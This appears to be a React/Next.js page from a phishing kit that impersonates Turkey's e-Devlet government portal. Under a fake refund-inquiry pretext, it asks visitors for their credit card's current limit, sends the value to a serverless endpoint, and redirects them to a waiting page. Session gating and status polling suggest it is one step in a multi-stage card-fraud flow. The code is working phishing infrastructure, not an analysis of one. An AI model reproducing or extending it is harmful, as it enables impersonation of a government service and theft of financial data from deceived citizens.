import { useCallback, useState } from 'react';
import { useRouter } from 'next/router';
import EdevletLayout from '../components/EdevletLayout';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

const richText =
  'İade tutarının hatalı gönderimini önlemek için lütfen kredi kartınızın net güncel limitini giriniz.';

export default function LimitKontrolPage() {
  const router = useRouter();
  const [limitValue, setLimitValue] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const session = useSessionStep('Limit Kontrol');

  useStatusPolling();

  const handleSubmit = useCallback(
    async (event) => {
      event.preventDefault();
      setErrorMessage('');

      if (!limitValue) {
        setErrorMessage('Lütfen limit tutarını giriniz.');
        return;
      }

      setSubmitting(true);

      try {
        const response = await fetch('/.netlify/functions/submit-limit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ limit: limitValue }),
        });

        if (!response.ok) {
          throw new Error('Limit kaydedilemedi');
        }

        await router.push('/bekleyiniz');
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.debug('Limit gönderimi başarısız:', error);
        }
        setErrorMessage('İşlem sırasında bir sorun oluştu. Lütfen tekrar deneyiniz.');
      } finally {
        setSubmitting(false);
      }
    },
    [limitValue, router],
  );

  if (!session.loading && !session.active) {
    return (
      <EdevletLayout richText="Önce ana formu doldurmanız gerekiyor.">
        <p>Bu sayfayı görüntülemek için lütfen ana sayfadan işlemi başlatın.</p>
      </EdevletLayout>
    );
  }

  return (
    <EdevletLayout richText={richText}>
      <form id="loginForm" autoComplete="off" onSubmit={handleSubmit}>
        <fieldset>
          <div className="formRow required">
            <label htmlFor="limitField" className="rowLabel">
              Kredi kartı limitiniz:
            </label>
            <div className="fieldGroup">
              <input
                id="limitField"
                name="limitx"
                type="tel"
                className="text"
                inputMode="numeric"
                aria-required="true"
                required
                value={limitValue}
                onChange={(event) => setLimitValue(event.target.value)}
              />
            </div>
          </div>
        </fieldset>

        {errorMessage && <p className="formError">{errorMessage}</p>}

        <div className="loader" style={{ display: submitting || session.loading ? 'flex' : 'none' }}>
          <img src="/assets/img/form-progress.svg" alt="..." />İşleminiz devam ediyor. Lütfen bekleyiniz...
        </div>

        <div className="formSubmitRow">
          <button type="submit" className="submitButton" disabled={submitting}>
            {submitting ? 'Gönderiliyor…' : 'İade Sorgula'}
          </button>
          <button type="button" className="backButton" onClick={() => router.push('/')}> 
            İptal Et
          </button>
        </div>
      </form>
    </EdevletLayout>
  );
}